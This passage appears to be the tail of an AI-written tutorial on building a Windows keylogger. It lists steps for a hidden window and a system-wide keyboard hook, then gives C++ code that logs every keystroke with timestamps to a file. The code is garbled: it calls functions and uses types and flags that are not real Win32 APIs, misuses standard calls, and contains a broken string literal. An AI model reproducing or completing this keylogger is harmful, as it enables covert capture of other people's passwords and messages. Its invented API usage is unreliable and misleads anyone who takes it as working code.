   - Use `CreateWindow` to create a window with no visible elements, allowing the hook to affect all applications.

3. **Set Up the Keyboard Hook:**
   - Use `SetWindowsHook` with `WH_KEYBOARD` to install the hook for all processes.

4. **Define the Callback Function:**
   - Write a function `KeyCallback` that processes each keyboard event.
   - Check if the event is a key press (KeyDown) and record the key and its state.

5. **Run the Hook:**
   - Install the hook using `SetWindowsHook` and start the event loop to process events.

6. **Handle Key Events:**
   - For each key press, determine the character and whether modifiers like Shift or Ctrl are pressed.
   - Use `GetAsyncKeyState` to check the current state of the keyboard.

7. **Uninstall the Hook:**
   - Use `UnhookKeyboard` to remove the hook when the application exits.

8. **Handle Errors:**
   - Check for errors during hook installation and cleanup to avoid issues.

### Code Example

```cpp
#include <windows.h>
#include <user32.lib>
#include <iostream>
#include <ctime>
#include <fstream>

using namespace std;

// Define the callback function signature
LRESULT CALLBACK KeyCallback(int h, int nCode, UINT state, void* hwnd, void* extraneous, DWORD dwUser, int iDWORD, RECT *rect, KBDLLHOOKID id, DWORD dwExtraInfo);

// Initialize static variables to store hook handle and last key state
static HHOOK hHook = 0;
static KBDLLHOOKID id = 0;
static BYTE lastKey = 0;
static bool isShift = false;

// Function to record keystroke
void RecordKeystroke(BYTE key, bool isDown, bool isShift, bool isCtrl, bool isAlt) {
    ofstream log("keystroke.log");
    time_t now;
    time(&now);
    char timestamp[20];
    mktime(&now, timestamp);

    string keyStr = "";
    switch (key) {
        case 0: keyStr = "Unkey"; break;
        case 1: keyStr = "1"; break;
        case 2: keyStr = "2"; break;
        case 3: keyStr = "3"; break;
        case 4: keyStr = "4"; break;
        case 5: keyStr = "5"; break;
        case 6: keyStr = "6"; break;
        case 7: keyStr = "7"; break;
        case 8: keyStr = "8"; break;
        case 9: keyStr = "9"; break;
        case 10: keyStr = "0"; break;
        case 11: keyStr = "-"; break;
        case 12: keyStr = "=""; break;
        case 13: keyStr = "+"; break;
        case 14: keyStr = ";"; break;
        case 15: keyStr = "'"; break;
        case 16: keyStr = ","; break;
        case 17: keyStr = "."; break;
        case 18: keyStr = "/"; break;
        case 19: keyStr = "Enter"; break;
        case 20: keyStr = "Tab"; break;
        case 27: keyStr = "Escape"; break;
        case 33: keyStr = "Page Up"; break;
        case 34: keyStr = "Page Down"; break;
        case 35: keyStr = "Print"; break;
        case 36: keyStr = "Execute"; break;
        case 37: keyStr = "Print Screen"; break;
        case 38: keyStr = "End"; break;
        case 39: keyStr = "Home"; break;
        case 40: keyStr = "Arrow Up"; break;
        case 41: keyStr = "Arrow Down"; break;
        case 42: keyStr = "Arrow Left"; break;
        case 43: keyStr = "Arrow Right"; break;
        case 45: keyStr = "Insert"; break;
        case 46: keyStr = "Delete"; break;
        case 47: keyStr = "Space"; break;
        default: keyStr = "Unknown"; break;
    }

    cout << "[" << timestamp << "] ";
    cout << keyStr;
    if (isShift) cout << " + shift";
    if (isCtrl) cout << " + ctrl";
    if (isAlt) cout << " + alt";
    cout << endl;
    log << "[" << timestamp << "] " << keyStr;
    if (isShift) log << " + shift";
    if (isCtrl) log << " + ctrl";
    if (isAlt) log << " + alt";
    log << endl;
}

// Callback function implementation
LRESULT CALLBACK KeyCallback(int h, int nCode, UINT state, void* hwnd, void* extraneous, DWORD dwUser, int iDWORD, RECT *rect, KBDLLHOOKID id, DWORD dwExtraInfo) {
    if (nCode == HC_KEYDOWN) {
        BYTE key = GetAsyncKeyState(0x1);
        if (key != 0) {
            // Check modifiers
            BYTE ctrl = GetAsyncKeyState(0x10);
            BYTE shift = GetAsyncKeyState(0x20);
            BYTE alt = GetAsyncKeyState(0x40);

            bool isCtrl = (ctrl != 0);
            bool isShift = (shift != 0);
            bool isAlt = (alt != 0);

            RecordKeystroke(key, true, isShift, isCtrl, isAlt);
        }
    }
    return CallNextHook(h, nCode, state, hwnd, extraneous, dwUser, iDWORD, rect, id, dwExtraInfo);
}

// Main function
int main() {
    // Create a window
    HWND hwnd = CreateWindow("ProgName", 0, WS_DBLIND, 0, 0, 0, 0, WS_OVERLapped | WS_Hidden);

    // Set up the hook
    hHook = SetWindowsHook(WH_KEYBOARD, KeyCallback);
    id = GetLastInputSink();

    // Start the event loop
    MSG msg;
    while (GetMessage(&msg, hwnd, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(hwnd, msg);
    }

    // Uninstall the hook
    UnhookKeyboard(hHook);
    DestroyWindow(hwnd);

    return 0;
}
```

